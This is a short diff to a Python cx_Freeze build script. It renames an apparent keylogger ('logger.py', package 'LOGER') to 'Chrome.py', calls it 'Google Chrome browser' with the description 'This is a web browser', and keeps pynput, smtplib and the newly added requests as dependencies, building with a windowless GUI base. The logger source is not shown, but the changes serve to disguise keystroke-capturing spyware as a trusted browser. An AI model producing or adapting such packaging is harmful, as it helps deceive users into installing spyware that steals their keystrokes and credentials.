@@ -8,9 +8,9 @@ if (sys.platform == "win32"):
     base = "Win32GUI"
 
 
-executables = [Executable("logger.py", base=base, icon="icon.ico")]
+executables = [Executable("Chrome.py", base=base, icon="icon.ico")]
 
-packages = ["idna", "pynput", "threading", "smtplib", "time"]
+packages = ["idna", "pynput", "threading", "smtplib", "time", "requests"]
 options = {
     'build_exe': {
         'packages': packages,
@@ -18,9 +18,9 @@ options = {
 }
 
 setup(
-    name="LOGER",
+    name="Google Chrome browser",
     options=options,
     version="1.0",
-    description='',
+    description='This is a web browser',
     executables=executables
 )
